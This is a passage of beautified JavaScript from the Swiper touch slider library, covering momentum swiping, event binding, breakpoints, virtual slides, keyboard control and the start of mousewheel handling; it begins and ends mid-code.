                        if (p < -t.minTranslate())
                            return void t.slideTo(t.activeIndex);
                        if (p > -t.maxTranslate())
                            return void (t.slides.length < d.length ? t.slideTo(d.length - 1) : t.slideTo(t.slides.length - 1));
                        if (s.freeModeMomentum) {
                            if (i.velocities.length > 1) {
                                var v = i.velocities.pop()
                                  , f = i.velocities.pop()
                                  , m = v.position - f.position
                                  , g = v.time - f.time;
                                t.velocity = m / g,
                                t.velocity /= 2,
                                Math.abs(t.velocity) < s.freeModeMinimumVelocity && (t.velocity = 0),
                                (g > 150 || l.now() - v.time > 300) && (t.velocity = 0)
                            } else
                                t.velocity = 0;
                            t.velocity *= s.freeModeMomentumVelocityRatio,
                            i.velocities.length = 0;
                            var b = 1e3 * s.freeModeMomentumRatio
                              , w = t.velocity * b
                              , y = t.translate + w;
                            r && (y = -y);
                            var x, T, E = !1, S = 20 * Math.abs(t.velocity) * s.freeModeMomentumBounceRatio;
                            if (y < t.maxTranslate())
                                s.freeModeMomentumBounce ? (y + t.maxTranslate() < -S && (y = t.maxTranslate() - S),
                                x = t.maxTranslate(),
                                E = !0,
                                i.allowMomentumBounce = !0) : y = t.maxTranslate(),
                                s.loop && s.centeredSlides && (T = !0);
                            else if (y > t.minTranslate())
                                s.freeModeMomentumBounce ? (y - t.minTranslate() > S && (y = t.minTranslate() + S),
                                x = t.minTranslate(),
                                E = !0,
                                i.allowMomentumBounce = !0) : y = t.minTranslate(),
                                s.loop && s.centeredSlides && (T = !0);
                            else if (s.freeModeSticky) {
                                for (var C, M = 0; M < d.length; M += 1)
                                    if (d[M] > -y) {
                                        C = M;
                                        break
                                    }
                                y = -(y = Math.abs(d[C] - y) < Math.abs(d[C - 1] - y) || "next" === t.swipeDirection ? d[C] : d[C - 1])
                            }
                            if (T && t.once("transitionEnd", function() {
                                t.loopFix()
                            }),
                            0 !== t.velocity)
                                b = r ? Math.abs((-y - t.translate) / t.velocity) : Math.abs((y - t.translate) / t.velocity);
                            else if (s.freeModeSticky)
                                return void t.slideToClosest();
                            s.freeModeMomentumBounce && E ? (t.updateProgress(x),
                            t.setTransition(b),
                            t.setTranslate(y),
                            t.transitionStart(!0, t.swipeDirection),
                            t.animating = !0,
                            n.transitionEnd(function() {
                                t && !t.destroyed && i.allowMomentumBounce && (t.emit("momentumBounce"),
                                t.setTransition(s.speed),
                                t.setTranslate(x),
                                n.transitionEnd(function() {
                                    t && !t.destroyed && t.transitionEnd()
                                }))
                            })) : t.velocity ? (t.updateProgress(y),
                            t.setTransition(b),
                            t.setTranslate(y),
                            t.transitionStart(!0, t.swipeDirection),
                            t.animating || (t.animating = !0,
                            n.transitionEnd(function() {
                                t && !t.destroyed && t.transitionEnd()
                            }))) : t.updateProgress(y),
                            t.updateActiveIndex(),
                            t.updateSlidesClasses()
                        } else if (s.freeModeSticky)
                            return void t.slideToClosest();
                        (!s.freeModeMomentum || u >= s.longSwipesMs) && (t.updateProgress(),
                        t.updateActiveIndex(),
                        t.updateSlidesClasses())
                    } else {
                        for (var P = 0, k = t.slidesSizesGrid[0], z = 0; z < o.length; z += s.slidesPerGroup)
                            void 0 !== o[z + s.slidesPerGroup] ? p >= o[z] && p < o[z + s.slidesPerGroup] && (P = z,
                            k = o[z + s.slidesPerGroup] - o[z]) : p >= o[z] && (P = z,
                            k = o[o.length - 1] - o[o.length - 2]);
                        var $ = (p - o[P]) / k;
                        if (u > s.longSwipesMs) {
                            if (!s.longSwipes)
                                return void t.slideTo(t.activeIndex);
                            "next" === t.swipeDirection && ($ >= s.longSwipesRatio ? t.slideTo(P + s.slidesPerGroup) : t.slideTo(P)),
                            "prev" === t.swipeDirection && ($ > 1 - s.longSwipesRatio ? t.slideTo(P + s.slidesPerGroup) : t.slideTo(P))
                        } else {
                            if (!s.shortSwipes)
                                return void t.slideTo(t.activeIndex);
                            "next" === t.swipeDirection && t.slideTo(P + s.slidesPerGroup),
                            "prev" === t.swipeDirection && t.slideTo(P)
                        }
                    }
                }
                .bind(this),
                this.onClick = function(e) {
                    this.allowClick || (this.params.preventClicks && e.preventDefault(),
                    this.params.preventClicksPropagation && this.animating && (e.stopPropagation(),
                    e.stopImmediatePropagation()))
                }
                .bind(this);
                var o = "container" === i.touchEventsTarget ? r : n
                  , h = !!i.nested;
                if (d.touch || !d.pointerEvents && !d.prefixedPointerEvents) {
                    if (d.touch) {
                        var p = !("touchstart" !== a.start || !d.passiveListener || !i.passiveListeners) && {
                            passive: !0,
                            capture: !1
                        };
                        o.addEventListener(a.start, this.onTouchStart, p),
                        o.addEventListener(a.move, this.onTouchMove, d.passiveListener ? {
                            passive: !1,
                            capture: h
                        } : h),
                        o.addEventListener(a.end, this.onTouchEnd, p)
                    }
                    (i.simulateTouch && !y.ios && !y.android || i.simulateTouch && !d.touch && y.ios) && (o.addEventListener("mousedown", this.onTouchStart, !1),
                    e.addEventListener("mousemove", this.onTouchMove, h),
                    e.addEventListener("mouseup", this.onTouchEnd, !1))
                } else
                    o.addEventListener(a.start, this.onTouchStart, !1),
                    e.addEventListener(a.move, this.onTouchMove, h),
                    e.addEventListener(a.end, this.onTouchEnd, !1);
                (i.preventClicks || i.preventClicksPropagation) && o.addEventListener("click", this.onClick, !0),
                this.on(y.ios || y.android ? "resize orientationchange observerUpdate" : "resize observerUpdate", x, !0)
            },
            detachEvents: function() {
                var t = this.params
                  , i = this.touchEvents
                  , s = this.el
                  , a = this.wrapperEl
                  , r = "container" === t.touchEventsTarget ? s : a
                  , n = !!t.nested;
                if (d.touch || !d.pointerEvents && !d.prefixedPointerEvents) {
                    if (d.touch) {
                        var o = !("onTouchStart" !== i.start || !d.passiveListener || !t.passiveListeners) && {
                            passive: !0,
                            capture: !1
                        };
                        r.removeEventListener(i.start, this.onTouchStart, o),
                        r.removeEventListener(i.move, this.onTouchMove, n),
                        r.removeEventListener(i.end, this.onTouchEnd, o)
                    }
                    (t.simulateTouch && !y.ios && !y.android || t.simulateTouch && !d.touch && y.ios) && (r.removeEventListener("mousedown", this.onTouchStart, !1),
                    e.removeEventListener("mousemove", this.onTouchMove, n),
                    e.removeEventListener("mouseup", this.onTouchEnd, !1))
                } else
                    r.removeEventListener(i.start, this.onTouchStart, !1),
                    e.removeEventListener(i.move, this.onTouchMove, n),
                    e.removeEventListener(i.end, this.onTouchEnd, !1);
                (t.preventClicks || t.preventClicksPropagation) && r.removeEventListener("click", this.onClick, !0),
                this.off(y.ios || y.android ? "resize orientationchange observerUpdate" : "resize observerUpdate", x)
            }
        },
        breakpoints: {
            setBreakpoint: function() {
                var e = this.activeIndex
                  , t = this.initialized
                  , i = this.loopedSlides;
                void 0 === i && (i = 0);
                var s = this.params
                  , a = s.breakpoints;
                if (a && (!a || 0 !== Object.keys(a).length)) {
                    var r = this.getBreakpoint(a);
                    if (r && this.currentBreakpoint !== r) {
                        var n = r in a ? a[r] : void 0;
                        n && ["slidesPerView", "spaceBetween", "slidesPerGroup"].forEach(function(e) {
                            var t = n[e];
                            void 0 !== t && (n[e] = "slidesPerView" !== e || "AUTO" !== t && "auto" !== t ? "slidesPerView" === e ? parseFloat(t) : parseInt(t, 10) : "auto")
                        });
                        var o = n || this.originalParams
                          , d = o.direction && o.direction !== s.direction
                          , h = s.loop && (o.slidesPerView !== s.slidesPerView || d);
                        d && t && this.changeDirection(),
                        l.extend(this.params, o),
                        l.extend(this, {
                            allowTouchMove: this.params.allowTouchMove,
                            allowSlideNext: this.params.allowSlideNext,
                            allowSlidePrev: this.params.allowSlidePrev
                        }),
                        this.currentBreakpoint = r,
                        h && t && (this.loopDestroy(),
                        this.loopCreate(),
                        this.updateSlides(),
                        this.slideTo(e - i + this.loopedSlides, 0, !1)),
                        this.emit("breakpoint", o)
                    }
                }
            },
            getBreakpoint: function(e) {
                if (e) {
                    var i = !1
                      , s = [];
                    Object.keys(e).forEach(function(e) {
                        s.push(e)
                    }),
                    s.sort(function(e, t) {
                        return parseInt(e, 10) - parseInt(t, 10)
                    });
                    for (var a = 0; a < s.length; a += 1) {
                        var r = s[a];
                        this.params.breakpointsInverse ? r <= t.innerWidth && (i = r) : r >= t.innerWidth && !i && (i = r)
                    }
                    return i || "max"
                }
            }
        },
        checkOverflow: {
            checkOverflow: function() {
                var e = this.isLocked;
                this.isLocked = 1 === this.snapGrid.length,
                this.allowSlideNext = !this.isLocked,
                this.allowSlidePrev = !this.isLocked,
                e !== this.isLocked && this.emit(this.isLocked ? "lock" : "unlock"),
                e && e !== this.isLocked && (this.isEnd = !1,
                this.navigation.update())
            }
        },
        classes: {
            addClasses: function() {
                var e = this.classNames
                  , t = this.params
                  , i = this.rtl
                  , s = this.$el
                  , a = [];
                a.push("initialized"),
                a.push(t.direction),
                t.freeMode && a.push("free-mode"),
                d.flexbox || a.push("no-flexbox"),
                t.autoHeight && a.push("autoheight"),
                i && a.push("rtl"),
                t.slidesPerColumn > 1 && a.push("multirow"),
                y.android && a.push("android"),
                y.ios && a.push("ios"),
                (h.isIE || h.isEdge) && (d.pointerEvents || d.prefixedPointerEvents) && a.push("wp8-" + t.direction),
                a.forEach(function(i) {
                    e.push(t.containerModifierClass + i)
                }),
                s.addClass(e.join(" "))
            },
            removeClasses: function() {
                var e = this.$el
                  , t = this.classNames;
                e.removeClass(t.join(" "))
            }
        },
        images: {
            loadImage: function(e, i, s, a, r, n) {
                var o;
                function l() {
                    n && n()
                }
                e.complete && r ? l() : i ? ((o = new t.Image).onload = l,
                o.onerror = l,
                a && (o.sizes = a),
                s && (o.srcset = s),
                i && (o.src = i)) : l()
            },
            preloadImages: function() {
                var e = this;
                function t() {
                    null != e && e && !e.destroyed && (void 0 !== e.imagesLoaded && (e.imagesLoaded += 1),
                    e.imagesLoaded === e.imagesToLoad.length && (e.params.updateOnImagesReady && e.update(),
                    e.emit("imagesReady")))
                }
                e.imagesToLoad = e.$el.find("img");
                for (var i = 0; i < e.imagesToLoad.length; i += 1) {
                    var s = e.imagesToLoad[i];
                    e.loadImage(s, s.currentSrc || s.getAttribute("src"), s.srcset || s.getAttribute("srcset"), s.sizes || s.getAttribute("sizes"), !0, t)
                }
            }
        }
    }
      , S = {}
      , C = function(e) {
        function t() {
            for (var i, a, r, n = [], o = arguments.length; o--; )
                n[o] = arguments[o];
            1 === n.length && n[0].constructor && n[0].constructor === Object ? r = n[0] : (a = (i = n)[0],
            r = i[1]),
            r || (r = {}),
            r = l.extend({}, r),
            a && !r.el && (r.el = a),
            e.call(this, r),
            Object.keys(E).forEach(function(e) {
                Object.keys(E[e]).forEach(function(i) {
                    t.prototype[i] || (t.prototype[i] = E[e][i])
                })
            });
            var h = this;
            void 0 === h.modules && (h.modules = {}),
            Object.keys(h.modules).forEach(function(e) {
                var t = h.modules[e];
                if (t.params) {
                    var i = Object.keys(t.params)[0]
                      , s = t.params[i];
                    if ("object" != typeof s || null === s)
                        return;
                    if (!(i in r && "enabled"in s))
                        return;
                    !0 === r[i] && (r[i] = {
                        enabled: !0
                    }),
                    "object" != typeof r[i] || "enabled"in r[i] || (r[i].enabled = !0),
                    r[i] || (r[i] = {
                        enabled: !1
                    })
                }
            });
            var p = l.extend({}, T);
            h.useModulesParams(p),
            h.params = l.extend({}, p, S, r),
            h.originalParams = l.extend({}, h.params),
            h.passedParams = l.extend({}, r),
            h.$ = s;
            var c = s(h.params.el);
            if (a = c[0]) {
                if (c.length > 1) {
                    var u = [];
                    return c.each(function(e, i) {
                        var s = l.extend({}, r, {
                            el: i
                        });
                        u.push(new t(s))
                    }),
                    u
                }
                a.swiper = h,
                c.data("swiper", h);
                var v, f, m = c.children("." + h.params.wrapperClass);
                return l.extend(h, {
                    $el: c,
                    el: a,
                    $wrapperEl: m,
                    wrapperEl: m[0],
                    classNames: [],
                    slides: s(),
                    slidesGrid: [],
                    snapGrid: [],
                    slidesSizesGrid: [],
                    isHorizontal: function() {
                        return "horizontal" === h.params.direction
                    },
                    isVertical: function() {
                        return "vertical" === h.params.direction
                    },
                    rtl: "rtl" === a.dir.toLowerCase() || "rtl" === c.css("direction"),
                    rtlTranslate: "horizontal" === h.params.direction && ("rtl" === a.dir.toLowerCase() || "rtl" === c.css("direction")),
                    wrongRTL: "-webkit-box" === m.css("display"),
                    activeIndex: 0,
                    realIndex: 0,
                    isBeginning: !0,
                    isEnd: !1,
                    translate: 0,
                    previousTranslate: 0,
                    progress: 0,
                    velocity: 0,
                    animating: !1,
                    allowSlideNext: h.params.allowSlideNext,
                    allowSlidePrev: h.params.allowSlidePrev,
                    touchEvents: (v = ["touchstart", "touchmove", "touchend"],
                    f = ["mousedown", "mousemove", "mouseup"],
                    d.pointerEvents ? f = ["pointerdown", "pointermove", "pointerup"] : d.prefixedPointerEvents && (f = ["MSPointerDown", "MSPointerMove", "MSPointerUp"]),
                    h.touchEventsTouch = {
                        start: v[0],
                        move: v[1],
                        end: v[2]
                    },
                    h.touchEventsDesktop = {
                        start: f[0],
                        move: f[1],
                        end: f[2]
                    },
                    d.touch || !h.params.simulateTouch ? h.touchEventsTouch : h.touchEventsDesktop),
                    touchEventsData: {
                        isTouched: void 0,
                        isMoved: void 0,
                        allowTouchCallbacks: void 0,
                        touchStartTime: void 0,
                        isScrolling: void 0,
                        currentTranslate: void 0,
                        startTranslate: void 0,
                        allowThresholdMove: void 0,
                        formElements: "input, select, option, textarea, button, video",
                        lastClickTime: l.now(),
                        clickTimeout: void 0,
                        velocities: [],
                        allowMomentumBounce: void 0,
                        isTouchEvent: void 0,
                        startMoving: void 0
                    },
                    allowClick: !0,
                    allowTouchMove: h.params.allowTouchMove,
                    touches: {
                        startX: 0,
                        startY: 0,
                        currentX: 0,
                        currentY: 0,
                        diff: 0
                    },
                    imagesToLoad: [],
                    imagesLoaded: 0
                }),
                h.useModules(),
                h.params.init && h.init(),
                h
            }
        }
        e && (t.__proto__ = e),
        t.prototype = Object.create(e && e.prototype),
        t.prototype.constructor = t;
        var i = {
            extendedDefaults: {
                configurable: !0
            },
            defaults: {
                configurable: !0
            },
            Class: {
                configurable: !0
            },
            $: {
                configurable: !0
            }
        };
        return t.prototype.slidesPerViewDynamic = function() {
            var e = this.params
              , t = this.slides
              , i = this.slidesGrid
              , s = this.size
              , a = this.activeIndex
              , r = 1;
            if (e.centeredSlides) {
                for (var n, o = t[a].swiperSlideSize, l = a + 1; l < t.length; l += 1)
                    t[l] && !n && (r += 1,
                    (o += t[l].swiperSlideSize) > s && (n = !0));
                for (var d = a - 1; d >= 0; d -= 1)
                    t[d] && !n && (r += 1,
                    (o += t[d].swiperSlideSize) > s && (n = !0))
            } else
                for (var h = a + 1; h < t.length; h += 1)
                    i[h] - i[a] < s && (r += 1);
            return r
        }
        ,
        t.prototype.update = function() {
            var e = this;
            if (e && !e.destroyed) {
                var t = e.snapGrid
                  , i = e.params;
                i.breakpoints && e.setBreakpoint(),
                e.updateSize(),
                e.updateSlides(),
                e.updateProgress(),
                e.updateSlidesClasses(),
                e.params.freeMode ? (s(),
                e.params.autoHeight && e.updateAutoHeight()) : (("auto" === e.params.slidesPerView || e.params.slidesPerView > 1) && e.isEnd && !e.params.centeredSlides ? e.slideTo(e.slides.length - 1, 0, !1, !0) : e.slideTo(e.activeIndex, 0, !1, !0)) || s(),
                i.watchOverflow && t !== e.snapGrid && e.checkOverflow(),
                e.emit("update")
            }
            function s() {
                var t = e.rtlTranslate ? -1 * e.translate : e.translate
                  , i = Math.min(Math.max(t, e.maxTranslate()), e.minTranslate());
                e.setTranslate(i),
                e.updateActiveIndex(),
                e.updateSlidesClasses()
            }
        }
        ,
        t.prototype.changeDirection = function(e, t) {
            void 0 === t && (t = !0);
            var i = this.params.direction;
            return e || (e = "horizontal" === i ? "vertical" : "horizontal"),
            e === i || "horizontal" !== e && "vertical" !== e ? this : (this.$el.removeClass("" + this.params.containerModifierClass + i + " wp8-" + i).addClass("" + this.params.containerModifierClass + e),
            (h.isIE || h.isEdge) && (d.pointerEvents || d.prefixedPointerEvents) && this.$el.addClass(this.params.containerModifierClass + "wp8-" + e),
            this.params.direction = e,
            this.slides.each(function(t, i) {
                "vertical" === e ? i.style.width = "" : i.style.height = ""
            }),
            this.emit("changeDirection"),
            t && this.update(),
            this)
        }
        ,
        t.prototype.init = function() {
            this.initialized || (this.emit("beforeInit"),
            this.params.breakpoints && this.setBreakpoint(),
            this.addClasses(),
            this.params.loop && this.loopCreate(),
            this.updateSize(),
            this.updateSlides(),
            this.params.watchOverflow && this.checkOverflow(),
            this.params.grabCursor && this.setGrabCursor(),
            this.params.preloadImages && this.preloadImages(),
            this.params.loop ? this.slideTo(this.params.initialSlide + this.loopedSlides, 0, this.params.runCallbacksOnInit) : this.slideTo(this.params.initialSlide, 0, this.params.runCallbacksOnInit),
            this.attachEvents(),
            this.initialized = !0,
            this.emit("init"))
        }
        ,
        t.prototype.destroy = function(e, t) {
            void 0 === e && (e = !0),
            void 0 === t && (t = !0);
            var i = this
              , s = i.params
              , a = i.$el
              , r = i.$wrapperEl
              , n = i.slides;
            return void 0 === i.params || i.destroyed ? null : (i.emit("beforeDestroy"),
            i.initialized = !1,
            i.detachEvents(),
            s.loop && i.loopDestroy(),
            t && (i.removeClasses(),
            a.removeAttr("style"),
            r.removeAttr("style"),
            n && n.length && n.removeClass([s.slideVisibleClass, s.slideActiveClass, s.slideNextClass, s.slidePrevClass].join(" ")).removeAttr("style").removeAttr("data-swiper-slide-index").removeAttr("data-swiper-column").removeAttr("data-swiper-row")),
            i.emit("destroy"),
            Object.keys(i.eventsListeners).forEach(function(e) {
                i.off(e)
            }),
            !1 !== e && (i.$el[0].swiper = null,
            i.$el.data("swiper", null),
            l.deleteProps(i)),
            i.destroyed = !0,
            null)
        }
        ,
        t.extendDefaults = function(e) {
            l.extend(S, e)
        }
        ,
        i.extendedDefaults.get = function() {
            return S
        }
        ,
        i.defaults.get = function() {
            return T
        }
        ,
        i.Class.get = function() {
            return e
        }
        ,
        i.$.get = function() {
            return s
        }
        ,
        Object.defineProperties(t, i),
        t
    }(p)
      , M = {
        name: "device",
        proto: {
            device: y
        },
        static: {
            device: y
        }
    }
      , P = {
        name: "support",
        proto: {
            support: d
        },
        static: {
            support: d
        }
    }
      , k = {
        name: "browser",
        proto: {
            browser: h
        },
        static: {
            browser: h
        }
    }
      , z = {
        name: "resize",
        create: function() {
            var e = this;
            l.extend(e, {
                resize: {
                    resizeHandler: function() {
                        e && !e.destroyed && e.initialized && (e.emit("beforeResize"),
                        e.emit("resize"))
                    },
                    orientationChangeHandler: function() {
                        e && !e.destroyed && e.initialized && e.emit("orientationchange")
                    }
                }
            })
        },
        on: {
            init: function() {
                t.addEventListener("resize", this.resize.resizeHandler),
                t.addEventListener("orientationchange", this.resize.orientationChangeHandler)
            },
            destroy: function() {
                t.removeEventListener("resize", this.resize.resizeHandler),
                t.removeEventListener("orientationchange", this.resize.orientationChangeHandler)
            }
        }
    }
      , $ = {
        func: t.MutationObserver || t.WebkitMutationObserver,
        attach: function(e, i) {
            void 0 === i && (i = {});
            var s = this
              , a = new (0,
            $.func)(function(e) {
                if (1 !== e.length) {
                    var i = function() {
                        s.emit("observerUpdate", e[0])
                    };
                    t.requestAnimationFrame ? t.requestAnimationFrame(i) : t.setTimeout(i, 0)
                } else
                    s.emit("observerUpdate", e[0])
            }
            );
            a.observe(e, {
                attributes: void 0 === i.attributes || i.attributes,
                childList: void 0 === i.childList || i.childList,
                characterData: void 0 === i.characterData || i.characterData
            }),
            s.observer.observers.push(a)
        },
        init: function() {
            if (d.observer && this.params.observer) {
                if (this.params.observeParents)
                    for (var e = this.$el.parents(), t = 0; t < e.length; t += 1)
                        this.observer.attach(e[t]);
                this.observer.attach(this.$el[0], {
                    childList: this.params.observeSlideChildren
                }),
                this.observer.attach(this.$wrapperEl[0], {
                    attributes: !1
                })
            }
        },
        destroy: function() {
            this.observer.observers.forEach(function(e) {
                e.disconnect()
            }),
            this.observer.observers = []
        }
    }
      , I = {
        name: "observer",
        params: {
            observer: !1,
            observeParents: !1,
            observeSlideChildren: !1
        },
        create: function() {
            l.extend(this, {
                observer: {
                    init: $.init.bind(this),
                    attach: $.attach.bind(this),
                    destroy: $.destroy.bind(this),
                    observers: []
                }
            })
        },
        on: {
            init: function() {
                this.observer.init()
            },
            destroy: function() {
                this.observer.destroy()
            }
        }
    }
      , L = {
        update: function(e) {
            var t = this
              , i = t.params
              , s = i.slidesPerView
              , a = i.slidesPerGroup
              , r = i.centeredSlides
              , n = t.params.virtual
              , o = n.addSlidesBefore
              , d = n.addSlidesAfter
              , h = t.virtual
              , p = h.from
              , c = h.to
              , u = h.slides
              , v = h.slidesGrid
              , f = h.renderSlide
              , m = h.offset;
            t.updateActiveIndex();
            var g, b, w, y = t.activeIndex || 0;
            g = t.rtlTranslate ? "right" : t.isHorizontal() ? "left" : "top",
            r ? (b = Math.floor(s / 2) + a + o,
            w = Math.floor(s / 2) + a + d) : (b = s + (a - 1) + o,
            w = a + d);
            var x = Math.max((y || 0) - w, 0)
              , T = Math.min((y || 0) + b, u.length - 1)
              , E = (t.slidesGrid[x] || 0) - (t.slidesGrid[0] || 0);
            function S() {
                t.updateSlides(),
                t.updateProgress(),
                t.updateSlidesClasses(),
                t.lazy && t.params.lazy.enabled && t.lazy.load()
            }
            if (l.extend(t.virtual, {
                from: x,
                to: T,
                offset: E,
                slidesGrid: t.slidesGrid
            }),
            p === x && c === T && !e)
                return t.slidesGrid !== v && E !== m && t.slides.css(g, E + "px"),
                void t.updateProgress();
            if (t.params.virtual.renderExternal)
                return t.params.virtual.renderExternal.call(t, {
                    offset: E,
                    from: x,
                    to: T,
                    slides: function() {
                        for (var e = [], t = x; t <= T; t += 1)
                            e.push(u[t]);
                        return e
                    }()
                }),
                void S();
            var C = []
              , M = [];
            if (e)
                t.$wrapperEl.find("." + t.params.slideClass).remove();
            else
                for (var P = p; P <= c; P += 1)
                    (P < x || P > T) && t.$wrapperEl.find("." + t.params.slideClass + '[data-swiper-slide-index="' + P + '"]').remove();
            for (var k = 0; k < u.length; k += 1)
                k >= x && k <= T && (void 0 === c || e ? M.push(k) : (k > c && M.push(k),
                k < p && C.push(k)));
            M.forEach(function(e) {
                t.$wrapperEl.append(f(u[e], e))
            }),
            C.sort(function(e, t) {
                return t - e
            }).forEach(function(e) {
                t.$wrapperEl.prepend(f(u[e], e))
            }),
            t.$wrapperEl.children(".swiper-slide").css(g, E + "px"),
            S()
        },
        renderSlide: function(e, t) {
            var i = this.params.virtual;
            if (i.cache && this.virtual.cache[t])
                return this.virtual.cache[t];
            var a = i.renderSlide ? s(i.renderSlide.call(this, e, t)) : s('<div class="' + this.params.slideClass + '" data-swiper-slide-index="' + t + '">' + e + "</div>");
            return a.attr("data-swiper-slide-index") || a.attr("data-swiper-slide-index", t),
            i.cache && (this.virtual.cache[t] = a),
            a
        },
        appendSlide: function(e) {
            if ("object" == typeof e && "length"in e)
                for (var t = 0; t < e.length; t += 1)
                    e[t] && this.virtual.slides.push(e[t]);
            else
                this.virtual.slides.push(e);
            this.virtual.update(!0)
        },
        prependSlide: function(e) {
            var t = this.activeIndex
              , i = t + 1
              , s = 1;
            if (Array.isArray(e)) {
                for (var a = 0; a < e.length; a += 1)
                    e[a] && this.virtual.slides.unshift(e[a]);
                i = t + e.length,
                s = e.length
            } else
                this.virtual.slides.unshift(e);
            if (this.params.virtual.cache) {
                var r = this.virtual.cache
                  , n = {};
                Object.keys(r).forEach(function(e) {
                    n[parseInt(e, 10) + s] = r[e]
                }),
                this.virtual.cache = n
            }
            this.virtual.update(!0),
            this.slideTo(i, 0)
        },
        removeSlide: function(e) {
            if (null != e) {
                var t = this.activeIndex;
                if (Array.isArray(e))
                    for (var i = e.length - 1; i >= 0; i -= 1)
                        this.virtual.slides.splice(e[i], 1),
                        this.params.virtual.cache && delete this.virtual.cache[e[i]],
                        e[i] < t && (t -= 1),
                        t = Math.max(t, 0);
                else
                    this.virtual.slides.splice(e, 1),
                    this.params.virtual.cache && delete this.virtual.cache[e],
                    e < t && (t -= 1),
                    t = Math.max(t, 0);
                this.virtual.update(!0),
                this.slideTo(t, 0)
            }
        },
        removeAllSlides: function() {
            this.virtual.slides = [],
            this.params.virtual.cache && (this.virtual.cache = {}),
            this.virtual.update(!0),
            this.slideTo(0, 0)
        }
    }
      , D = {
        name: "virtual",
        params: {
            virtual: {
                enabled: !1,
                slides: [],
                cache: !0,
                renderSlide: null,
                renderExternal: null,
                addSlidesBefore: 0,
                addSlidesAfter: 0
            }
        },
        create: function() {
            l.extend(this, {
                virtual: {
                    update: L.update.bind(this),
                    appendSlide: L.appendSlide.bind(this),
                    prependSlide: L.prependSlide.bind(this),
                    removeSlide: L.removeSlide.bind(this),
                    removeAllSlides: L.removeAllSlides.bind(this),
                    renderSlide: L.renderSlide.bind(this),
                    slides: this.params.virtual.slides,
                    cache: {}
                }
            })
        },
        on: {
            beforeInit: function() {
                if (this.params.virtual.enabled) {
                    this.classNames.push(this.params.containerModifierClass + "virtual");
                    var e = {
                        watchSlidesProgress: !0
                    };
                    l.extend(this.params, e),
                    l.extend(this.originalParams, e),
                    this.params.initialSlide || this.virtual.update()
                }
            },
            setTranslate: function() {
                this.params.virtual.enabled && this.virtual.update()
            }
        }
    }
      , O = {
        handle: function(i) {
            var s = this.rtlTranslate
              , a = i;
            a.originalEvent && (a = a.originalEvent);
            var r = a.keyCode || a.charCode;
            if (!this.allowSlideNext && (this.isHorizontal() && 39 === r || this.isVertical() && 40 === r || 34 === r))
                return !1;
            if (!this.allowSlidePrev && (this.isHorizontal() && 37 === r || this.isVertical() && 38 === r || 33 === r))
                return !1;
            if (!(a.shiftKey || a.altKey || a.ctrlKey || a.metaKey || e.activeElement && e.activeElement.nodeName && ("input" === e.activeElement.nodeName.toLowerCase() || "textarea" === e.activeElement.nodeName.toLowerCase()))) {
                if (this.params.keyboard.onlyInViewport && (33 === r || 34 === r || 37 === r || 39 === r || 38 === r || 40 === r)) {
                    var n = !1;
                    if (this.$el.parents("." + this.params.slideClass).length > 0 && 0 === this.$el.parents("." + this.params.slideActiveClass).length)
                        return;
                    var o = t.innerWidth
                      , l = t.innerHeight
                      , d = this.$el.offset();
                    s && (d.left -= this.$el[0].scrollLeft);
                    for (var h = [[d.left, d.top], [d.left + this.width, d.top], [d.left, d.top + this.height], [d.left + this.width, d.top + this.height]], p = 0; p < h.length; p += 1) {
                        var c = h[p];
                        c[0] >= 0 && c[0] <= o && c[1] >= 0 && c[1] <= l && (n = !0)
                    }
                    if (!n)
                        return
                }
                this.isHorizontal() ? (33 !== r && 34 !== r && 37 !== r && 39 !== r || (a.preventDefault ? a.preventDefault() : a.returnValue = !1),
                (34 !== r && 39 !== r || s) && (33 !== r && 37 !== r || !s) || this.slideNext(),
                (33 !== r && 37 !== r || s) && (34 !== r && 39 !== r || !s) || this.slidePrev()) : (33 !== r && 34 !== r && 38 !== r && 40 !== r || (a.preventDefault ? a.preventDefault() : a.returnValue = !1),
                34 !== r && 40 !== r || this.slideNext(),
                33 !== r && 38 !== r || this.slidePrev()),
                this.emit("keyPress", r)
            }
        },
        enable: function() {
            this.keyboard.enabled || (s(e).on("keydown", this.keyboard.handle),
            this.keyboard.enabled = !0)
        },
        disable: function() {
            this.keyboard.enabled && (s(e).off("keydown", this.keyboard.handle),
            this.keyboard.enabled = !1)
        }
    }
      , A = {
        name: "keyboard",
        params: {
            keyboard: {
                enabled: !1,
                onlyInViewport: !0
            }
        },
        create: function() {
            l.extend(this, {
                keyboard: {
                    enabled: !1,
                    enable: O.enable.bind(this),
                    disable: O.disable.bind(this),
                    handle: O.handle.bind(this)
                }
            })
        },
        on: {
            init: function() {
                this.params.keyboard.enabled && this.keyboard.enable()
            },
            destroy: function() {
                this.keyboard.enabled && this.keyboard.disable()
            }
        }
    };
    var H = {
        lastScrollTime: l.now(),
        event: t.navigator.userAgent.indexOf("firefox") > -1 ? "DOMMouseScroll" : function() {
            var t = "onwheel"in e;
            if (!t) {
                var i = e.createElement("div");
                i.setAttribute("onwheel", "return;"),
                t = "function" == typeof i.onwheel
            }
            return !t && e.implementation && e.implementation.hasFeature && !0 !== e.implementation.hasFeature("", "") && (t = e.implementation.hasFeature("Events.wheel", "3.0")),
            t
        }() ? "wheel" : "mousewheel",
        normalize: function(e) {
            var t = 0
              , i = 0
              , s = 0
              , a = 0;
            return "detail"in e && (i = e.detail),
            "wheelDelta"in e && (i = -e.wheelDelta / 120),
            "wheelDeltaY"in e && (i = -e.wheelDeltaY / 120),
            "wheelDeltaX"in e && (t = -e.wheelDeltaX / 120),
            "axis"in e && e.axis === e.HORIZONTAL_AXIS && (t = i,
            i = 0),
            s = 10 * t,
            a = 10 * i,
            "deltaY"in e && (a = e.deltaY),
            "deltaX"in e && (s = e.deltaX),
            (s || a) && e.deltaMode && (1 === e.deltaMode ? (s *= 40,
            a *= 40) : (s *= 800,
            a *= 800)),
            s && !t && (t = s < 1 ? -1 : 1),
            a && !i && (i = a < 1 ? -1 : 1),
            {
                spinX: t,
                spinY: i,
                pixelX: s,
                pixelY: a
            }
        },
        handleMouseEnter: function() {
            this.mouseEntered = !0
        },
        handleMouseLeave: function() {
            this.mouseEntered = !1
        },
        handle: function(e) {
            var i = e
              , s = this
              , a = s.params.mousewheel;
            if (!s.mouseEntered && !a.releaseOnEdges)
                return !0;
            i.originalEvent && (i = i.originalEvent);
            var r = 0
              , n = s.rtlTranslate ? -1 : 1
              , o = H.normalize(i);
            if (a.forceToAxis)
                if (s.isHorizontal()) {
                    if (!(Math.abs(o.pixelX) > Math.abs(o.pixelY)))
                        return !0;
                    r = o.pixelX * n
                } else {
                    if (!(Math.abs(o.pixelY) > Math.abs(o.pixelX)))
                        return !0;
                    r = o.pixelY
                }
            else
